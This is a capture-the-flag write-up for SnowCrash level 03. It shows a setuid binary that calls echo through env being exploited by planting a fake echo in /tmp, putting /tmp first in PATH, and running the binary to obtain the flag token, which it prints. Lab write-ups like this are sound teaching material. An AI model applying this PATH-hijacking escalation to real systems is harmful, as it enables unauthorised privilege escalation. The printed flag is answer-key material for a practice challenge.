# Level 03

A quick reverse engineering of the binary shows us that it uses the system function to execute echo which is easy to exploit by making it execute the wrong echo

```c
  system("/usr/bin/env echo Exploit me");
```

The binary can execute getflag because it is owned by flag03

We start by creating a fake echo that will just getflag
```bash
echo getflag > /tmp/echo
```

We add it in first in the path so it overrides the actual echo which is in /bin

```bash
export PATH=/tmp:$PATH
```

Eventually we give everybody the rights to execute this file
```bash
level03@SnowCrash:/tmp$ chmod 777 echo
```

```bash
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

**Flag** : qi0maab88jeaj46qoumi7maus